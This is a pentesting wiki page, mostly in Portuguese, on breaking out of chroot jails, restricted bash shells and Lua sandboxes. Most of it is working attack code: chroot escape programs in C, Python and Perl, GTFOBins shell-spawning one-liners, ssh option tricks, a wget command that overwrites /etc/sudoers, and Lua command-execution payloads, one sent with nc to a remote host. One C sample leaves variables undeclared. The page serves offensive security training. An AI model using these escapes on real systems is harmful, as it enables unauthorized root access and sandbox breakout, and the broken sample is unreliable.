# Escaping from Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Procure em** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **se você conseguir executar qualquer binário com propriedade "Shell"**

## Chroot Escapes

De [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): O mecanismo chroot **não foi projetado para defender** contra manipulação intencional por **usuários** (**root**) **privilegiados**. Na maioria dos sistemas, contextos chroot não se empilham corretamente e programas em chroot **com privilégios suficientes podem realizar um segundo chroot para escapar**.\
Normalmente isso significa que, para escapar, você precisa ser root dentro do chroot.

> [!TIP]
> A **ferramenta** [**chw00t**](https://github.com/earthquake/chw00t) foi criada para abusar dos seguintes escenarios e escapar de `chroot`.

### Root + CWD

> [!WARNING]
> Se você for **root** dentro de um chroot, você **pode escapar** criando **outro chroot**. Isso porque 2 chroots não podem coexistir (no Linux), então, se você criar uma pasta e depois **criar um novo chroot** nessa nova pasta estando **fora dela**, você agora estará **fora do novo chroot** e, portanto, estará no FS.
>
> Isso ocorre porque normalmente o chroot NÃO move seu diretório de trabalho para o indicado, então você pode criar um chroot e ficar fora dele.

Normalmente você não encontrará o binário `chroot` dentro de uma jail chroot, mas você **poderia compilar, enviar e executar** um binário:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Isto é semelhante ao caso anterior, mas neste caso o **attacker stores a file descriptor to the current directory** e então **creates the chroot in a new folder**. Por fim, como ele tem **access** a esse **FD** **outside** do chroot, ele acessa e **escapes**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD can be passed over Unix Domain Sockets, so:
>
> - Create a child process (fork)
> - Create UDS so parent and child can talk
> - Run chroot in child process in a different folder
> - In parent proc, create a FD of a folder that is outside of new child proc chroot
> - Pass to child procc that FD using the UDS
> - Child process chdir to that FD, and because it's ouside of its chroot, he will escape the jail

### Root + Mount

> [!WARNING]
>
> - Mounting root device (/) into a directory inside the chroot
> - Chrooting into that directory
>
> This is possible in Linux

### Root + /proc

> [!WARNING]
>
> - Mount procfs into a directory inside the chroot (if it isn't yet)
> - Look for a pid that has a different root/cwd entry, like: /proc/1/root
> - Chroot into that entry

### Root(?) + Fork

> [!WARNING]
>
> - Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it
> - From the parent process, move the folder where the child process is in a folder previous to the chroot of the children
> - This children process will find himself outside of the chroot

### ptrace

> [!WARNING]
>
> - Time ago users could debug its own processes from a process of itself... but this is not possible by default anymore
> - Anyway, if it's possible, you could ptrace into a process and execute a shellcode inside of it ([see this example](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Obtenha informações sobre a jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modificar PATH

Verifique se você pode modificar a variável de ambiente PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Usando vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers and help viewers

Muitos ambientes restritos ainda deixam **pagers** ou **help viewers** disponíveis. Normalmente, eles são mais rápidos de abusar do que tentar reconstruir `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Se `git` estiver disponível, lembre-se de que sua saída de ajuda geralmente passa por um pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### One-liners comuns de GTFOBins

Assim que você souber quais binários estão acessíveis, teste primeiro os geradores de shell óbvios:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Se você só consegue **injetar argumentos** em um comando permitido (em vez de executá-lo livremente), também verifique **GTFOArgs**.

### Criar script

Verifique se você consegue criar um arquivo executável com _/bin/bash_ como conteúdo
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obtenha bash via SSH

Se você estiver acessando via ssh, muitas vezes pode pedir ao servidor para executar um **programa diferente** em vez do restricted login shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Se `ssh` for um dos poucos binários permitidos localmente, lembre-se de que ele também pode ser abusado como um **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declarar
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Você pode sobrescrever, por exemplo, o arquivo sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Alguns ambientes não te colocam em um `rbash` puro, mas em **wrappers** como `git-shell`, `rssh` ou `lshell`:

- `git-shell` só aceita comandos Git do lado do servidor além de qualquer coisa presente em `~/git-shell-commands/`. Se esse diretório existir, execute `help` para enumerar as ações customizadas permitidas. Se você conseguir **escrever** ali, qualquer executável colocado nesse diretório se torna acessível.
- `rssh` / `lshell` normalmente permitem apenas `scp`, `sftp`, `rsync` ou operações no estilo Git. Nesses casos, foque primeiro em **file write primitives**: envie `authorized_keys`, um arquivo de inicialização da shell ou um script auxiliar para um local gravável e depois reconecte com `ssh -t ...`.
- Se o wrapper apenas filtra a linha de comando, enumere os binários acessíveis e então volte para **GTFOBins / GTFOArgs**.

### Other tricks

Also check:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**It could also be interesting the page:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Tricks about escaping from python jails in the following page:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Alguns truques para **chamar funções de uma library sem usar pontos**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumerar funções de uma biblioteca:
```bash
for k,v in pairs(string) do print(k,v) end
```
Note que toda vez que você executa a one liner anterior em um **diferente lua environment a ordem das funções muda**. Portanto, se você precisar executar uma função específica, pode realizar um brute force attack carregando diferentes lua environments e chamando a primeira função da le library:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obtenha um shell interativo do lua**: Se você estiver dentro de um shell lua limitado, você pode obter um novo shell lua (e, com sorte, ilimitado) chamando:
```bash
debug.debug()
```
## Referências

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
